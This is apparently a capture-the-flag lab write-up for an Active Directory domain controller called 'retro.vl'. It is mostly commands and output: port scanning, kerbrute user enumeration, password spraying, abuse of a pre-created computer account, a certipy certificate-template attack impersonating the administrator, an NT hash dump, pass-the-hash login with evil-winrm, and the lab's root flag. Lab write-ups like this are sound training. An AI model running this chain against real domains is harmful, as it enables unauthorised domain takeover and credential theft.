Scan : 
```sh
Host is up (0.019s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-29 11:32:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-07-29T11:17:32
|_Not valid after:  2025-07-29T11:17:32
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-07-29T11:17:32
|_Not valid after:  2025-07-29T11:17:32
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-07-29T11:17:32
|_Not valid after:  2025-07-29T11:17:32
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-07-29T11:17:32
|_Not valid after:  2025-07-29T11:17:32
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2024-07-28T11:26:17
|_Not valid after:  2025-01-27T11:26:17
|_ssl-date: 2024-07-29T11:33:50+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-29T11:33:10+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time:
|   date: 2024-07-29T11:33:13
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

- Kerbrute  : 
```sh
[Jul 29, 2024 - 14:13:16 (CEST)] exegol-Algo /workspace # kerbrute userenum --dc $t -d retro.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 07/29/24 - Ronnie Flathers @ropnop

2024/07/29 14:14:41 >  Using KDC(s):
2024/07/29 14:14:41 >   10.10.65.99:88

2024/07/29 14:14:42 >  [+] VALID USERNAME:       guest@retro.vl
2024/07/29 14:14:45 >  [+] VALID USERNAME:       administrator@retro.vl
2024/07/29 14:15:25 >  [+] VALID USERNAME:       Guest@retro.vl
2024/07/29 14:15:25 >  [+] VALID USERNAME:       Administrator@retro.vl
2024/07/29 14:15:43 >  [+] VALID USERNAME:       tblack@retro.vl
2024/07/29 14:16:02 >  [+] VALID USERNAME:       banking@retro.vl
2024/07/29 14:17:06 >  [+] VALID USERNAME:       trainee@retro.vl
2024/07/29 14:17:40 >  [+] VALID USERNAME:       GUEST@retro.vl
2024/07/29 14:25:01 >  [+] VALID USERNAME:       Banking@retro.vl
2024/07/29 14:32:54 >  [+] VALID USERNAME:       jburley@retro.vl
```
- Password spraying : 
```sh
netexec smb 10.10.65.99 -u usert.txt -p usert.txt --no-bruteforce --continue-on-success
```
- Enumerate share : 
```sh
netexec smb 10.10.65.99 -u "trainee" -p "trainee" --group
```
- Todolist : 
```sh
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James#
```
- Bloodhound :
```sh
bloodhound-python -d 'retro.VL' -u 'trainee' -p 'trainee' -ns  10.10.65.99  -dc dc.retro.vl -c all
```

```sh
pre2k auth -u banking -p banking -d retro.vl -dc-ip 10.10.65.99 -verbose
```

```sh
changepasswd.py retro.vl/banking\$@10.10.65.99 -newpass 'TestPass!2' -p rpc-samr
```


// Not working but good to try ;)
```sh
getTGT.py -dc-ip "10.10.65.99" "retro.vl"/'banking':'TestPass!2'
```

```sh
export KRB5CCNAME=/workspace/banking.ccache
```

```sh
GetNPUsers.py -debug -dc-ip 10.10.65.99 retro.vl/'banking' -k -no-pass -request
```

//

- Enumeration  certificate with certipy : 
```sh
certipy find -u 'banking$'@retro.vl -p 'TestPass!2' -dc-ip 10.10.65.99
```

`'banking$'` Notation for machine account , service same for bloodhound .


**Find vulnerable certificate templates :**
```sh
certipy find -u 'banking$'@retro.vl -p 'TestPass!2' -dc-ip 10.10.65.99
```

**Impersonate an admin :**
```sh
certipy req -username 'banking$'@retro.vl -password 'TestPass!2' -target-ip 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl'  -debug -key-size 4096
```

Then you can transform the generated **certificate to** `**.pfx**` format and use it to **authenticate using   certipy** again:
```sh
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.65.99
```

- Result : 
```sh
[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

- Foothold  :
```sh
evil-winrm -i 10.10.65.99 -u Administrator -H '252fac7066d93dd009d4fd2cd0368389'
```

Root VL{8b13de0d077813ff16c5e792186bdde4} 



